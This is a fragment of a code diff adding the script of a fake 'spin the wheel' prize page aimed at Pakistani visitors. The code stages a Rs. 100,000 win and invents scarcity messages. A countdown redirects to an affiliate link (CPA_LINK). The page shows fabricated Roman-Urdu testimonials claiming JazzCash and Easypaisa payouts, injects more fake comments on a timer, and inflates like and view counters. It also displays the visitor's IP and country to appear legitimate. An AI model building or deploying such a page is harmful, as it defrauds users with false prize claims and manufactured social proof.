+      setTimeout(()=>{msg.style.display='none';enableButtons();},2000);
+    } else if(prize==="Rs. 100,000") {
+      msg.textContent='🎉 You won Rs. 100,000! 🎉'; msg.className='result-message win'; msg.style.display='block';
+      disablePermanently();
+      setTimeout(()=>{
+        document.getElementById('winPurpose').textContent='cover your needs';
+        updateScarcity(); document.getElementById('winCongratsModal').style.display='flex'; startConfetti();
+      },2000);
+    } else {
+      msg.textContent='🎉 You won '+prize+'! 🎉'; msg.className='result-message win'; msg.style.display='block';
+      setTimeout(()=>{msg.style.display='none';enableButtons();},2500);
+    }
+  }
+
+  const notifOverlay=document.getElementById('notificationOverlay'); let notifTimer=null;
+  function showNotification() { if(notifTimer)clearTimeout(notifTimer); notifOverlay.classList.add('show'); notifTimer=setTimeout(()=>hideNotification(),15000); }
+  function hideNotification() { notifOverlay.classList.remove('show'); if(notifTimer)clearTimeout(notifTimer); enableButtons(); }
+  document.getElementById('notifCloseBtn').addEventListener('click',hideNotification);
+
+  const confCanvas=document.getElementById('confetti-canvas'), confCtx=confCanvas.getContext('2d');
+  let confParticles=[], confId=null;
+  function resizeConf(){confCanvas.width=innerWidth;confCanvas.height=innerHeight;}
+  window.addEventListener('resize',resizeConf);resizeConf();
+  function startConfetti(){
+    confParticles=[]; const cols=['#FFD700','#25D366','#FF4500','#1E90FF','#FF69B4','#FFF'];
+    for(let i=0;i<200;i++)confParticles.push({x:Math.random()*confCanvas.width,y:-Math.random()*confCanvas.height,s:Math.random()*8+4,c:cols[Math.floor(Math.random()*cols.length)],vy:Math.random()*5+4,vx:(Math.random()-0.5)*3,r:Math.random()*360,rs:(Math.random()-0.8)*12,o:1});
+    if(confId)cancelAnimationFrame(confId);
+    (function anim(){confCtx.clearRect(0,0,confCanvas.width,confCanvas.height);let active=false;for(let p of confParticles){p.y+=p.vy;p.x+=p.vx;p.r+=p.rs;p.o-=0.003;if(p.o<=0)continue;active=true;confCtx.save();confCtx.translate(p.x,p.y);confCtx.rotate(p.r*Math.PI/180);confCtx.globalAlpha=p.o;confCtx.fillStyle=p.c;confCtx.fillRect(-p.s/2,-p.s/4,p.s,p.s/2);confCtx.restore();}if(active)confId=requestAnimationFrame(anim);else{confCtx.clearRect(0,0,confCanvas.width,confCanvas.height);confId=null;}})();
+  }
+
+  let timerInterval=null,timerSec=30;
+  function startTimer(){timerSec=30;const d=document.getElementById('countdownTimer');function upd(){const m=Math.floor(timerSec/60),s=timerSec%60;d.textContent=String(m).padStart(2,'0')+':'+String(s).padStart(2,'0');if(timerSec<=10)d.style.color='#f00';if(timerSec<=0){clearInterval(timerInterval);d.textContent='00:00';window.location.href=CPA_LINK;}timerSec--;}upd();timerInterval=setInterval(upd,1000);}
+  function stopTimer(){if(timerInterval){clearInterval(timerInterval);timerInterval=null;}}
+
+  function updateScarcity(){document.querySelectorAll('.scarcity-note').forEach(el=>el.textContent='🔥 You are 1 among only '+(Math.floor(Math.random()*2)+2)+' selected today!');}
+
+  // FIXED: Using flagcdn.com for reliable flag images
+  function setCountryFlag(code) {
+    const img = document.getElementById('countryFlagImg');
+    if (code && code.length === 2) {
+      img.src = 'https://flagcdn.com/24x18/' + code.toLowerCase() + '.png';
+      img.style.display = 'inline-block';
+    }
+  }
+
+  async function getIP(){
+    const ipEl = document.getElementById('userIP');
+    const countryEl = document.getElementById('userCountry');
+    
+    try {
+      const r = await fetch('https://api.ipify.org?format=json');
+      const d = await r.json();
+      ipEl.textContent = d.ip;
+      
+      const g = await fetch('https://ipapi.co/' + d.ip + '/json/');
+      const gd = await g.json();
+      
+      if (gd.country_name && gd.country_code) {
+        setCountryFlag(gd.country_code);
+        countryEl.textContent = gd.country_name;
+      } else {
+        setCountryFlag('PK');
+        countryEl.textContent = 'Pakistan';
+      }
+    } catch(e) {
+      ipEl.textContent = 'Detected';
+      setCountryFlag('PK');
+      countryEl.textContent = 'Pakistan';
+    }
+    
+    document.getElementById('initialDevice').textContent = /iPad|iPhone|iPod/.test(navigator.userAgent) ? 'iOS Mobile' : /Android/.test(navigator.userAgent) ? 'Android Mobile' : 'Desktop';
+    updateScarcity();
+  }
+
+  (function(){const c=document.getElementById('particles');for(let i=0;i<30;i++){const p=document.createElement('div');p.className='particle';const s=Math.random()*8+4;p.style.cssText='width:'+s+'px;height:'+s+'px;left:'+Math.random()*100+'%;background:'+(Math.random()>.6?'#FFD700':'#fff')+';animation-duration:'+(Math.random()*12+8)+'s;animation-delay:'+Math.random()*6+'s;';c.appendChild(p);}})();
+
+  const comments=[
+    {n:"Ahmed R.",m:"Yaar 100,000 ka kya scene hai? 😍",t:"just now",l:"Karachi"},
+    {n:"Fatima K.",m:"Mujhe to sirf try again mila yaar 😭",t:"1m ago",l:"Lahore"},
+    {n:"Bilal A.",m:"Bhai mera number lag gaya! Paisa aa gaya JazzCash me 🔥🔥",t:"1m ago",l:"Islamabad"},
+    {n:"Sana U.",m:"Ya Allah maine 100,000 jeet liye 😭🙏",t:"2m ago",l:"Rawalpindi"},
+    {n:"Hamza Z.",m:"Arey wah! Kamal ho gaya, free money 💸",t:"2m ago",l:"Peshawar"},
+    {n:"Ayesha L.",m:"I missed it by one segment.. so close 😩",t:"3m ago",l:"Multan"},
+    {n:"Omar F.",m:"Koi shak? Legit hai bhai log! Claimed ✅",t:"3m ago",l:"Faisalabad"},
+    {n:"Zara N.",m:"Mujhe try again aaya lekin phir bhi happy hoon 😊",t:"4m ago",l:"Quetta"},
+    {n:"Ali B.",m:"Paisa Easypaisa me bhi transfer ho gaya, zabardast 🚀",t:"4m ago",l:"Sialkot"},
+    {n:"Maham S.",m:"I thought it was fake but it actually works wow",t:"5m ago",l:"Gujranwala"}
+  ];
+
+  const cl=document.getElementById('comments-list');
+  function renderComment(c){
+    const d=document.createElement('div');d.className='comment-card';
+    d.innerHTML='<div class="comment-avatar">'+c.n.charAt(0).toUpperCase()+'</div><div class="comment-content"><div class="comment-name">'+c.n+' <span style="color:#555;font-size:11px">• '+c.t+'</span></div><div class="comment-text">'+c.m+'</div><div class="comment-location">📍 '+c.l+'</div></div>';
+    return d;
+  }
+  comments.forEach((c,i)=>{const d=renderComment(c);d.style.animationDelay=i*0.03+'s';cl.appendChild(d);});
+
+  const autoComments = [
+    {n:"Hassan T.",m:"Abhi abhi khela, 100k aaya bhai! 🎉🎉",l:"Kasur"},
+    {n:"Sania M.",m:"Kya baat hai yaar, pehli baar me jeet gaya 😎",l:"Mandi Bahauddin"},
+    {n:"Waqas R.",m:"Mera dost bata raha tha, pehle yakeen nahi tha lekin ab khud jeet liya",l:"Khushab"},
+    {n:"Maria S.",m:"Fake lagta tha lekin seriously kaam karta hai 🤩",l:"Chiniot"}
+  ];
+  let autoIndex = 0;
+  setInterval(() => {
+    if(document.getElementById('notificationOverlay').classList.contains('show')) return;
+    const c = autoComments[autoIndex % autoComments.length];
+    comments.unshift({n:c.n, m:c.m, t:"just now", l:c.l});
+    const d = renderComment(comments[0]);
+    d.style.border = '1px solid #2a2a2a';
+    cl.insertBefore(d, cl.firstChild);
+    if(cl.children.length > 40) cl.removeChild(cl.lastChild);
+    autoIndex++;
+  }, 8000 + Math.random() * 10000);
+
+  const ci=document.getElementById('userComment'),ciName=document.getElementById('userName'),ciLocation=document.getElementById('userLocation'),pb=document.getElementById('postComment');
+  pb.addEventListener('click',()=>{
+    const text=ci.value.trim(),name=ciName.value.trim()||'Anonymous',location=ciLocation.value.trim()||'Pakistan';
+    if(!text)return;
+    comments.unshift({n:name,m:text,t:"Just now",l:location});
+    const d=renderComment(comments[0]);
+    d.style.border='1px solid #25D366';d.style.background='#0d1a12';
+    d.querySelector('.comment-avatar').style.background='var(--primary)';d.querySelector('.comment-avatar').style.color='#000';d.querySelector('.comment-avatar').textContent='✓';
+    d.querySelector('.comment-name').innerHTML=name+' <span style="color:#25D366;font-size:11px">• Just now</span>';
+    cl.insertBefore(d,cl.firstChild);
+    ci.value='';ciName.value='';ciLocation.value='';pb.disabled=true;pb.textContent='POSTED ✓';
+    setTimeout(()=>{pb.disabled=false;pb.textContent='POST';},3000);
+  });
+  ci.addEventListener('keypress',e=>{if(e.key==='Enter')pb.click();});
+  ciName.addEventListener('keypress',e=>{if(e.key==='Enter')ciLocation.focus();});
+  ciLocation.addEventListener('keypress',e=>{if(e.key==='Enter')ci.focus();});
+
+  let likes=1205,views=300450;
+  setInterval(()=>{likes+=Math.floor(Math.random()*5)+2;document.querySelector('.likes-text').textContent='❤️ '+likes.toLocaleString()+'+';},1400);
+  setInterval(()=>{views+=Math.floor(Math.random()*250)-80;if(views<295000)views=295000;document.querySelector('.views-text').textContent=views.toLocaleString()+'+';},1800);
+
+  document.getElementById('continueBtn').addEventListener('click',()=>document.getElementById('initialModal').style.display='none');
+  document.getElementById('winProceedBtn').addEventListener('click',()=>{document.getElementById('winCongratsModal').style.display='none';updateScarcity();document.getElementById('winConfirmModal').style.display='flex';startTimer();});
+  document.getElementById('proceedBtn').addEventListener('click',()=>{stopTimer();window.location.href=CPA_LINK;});
+
+  draw();getIP();
+})();
+</script>
+</body>
+</html>
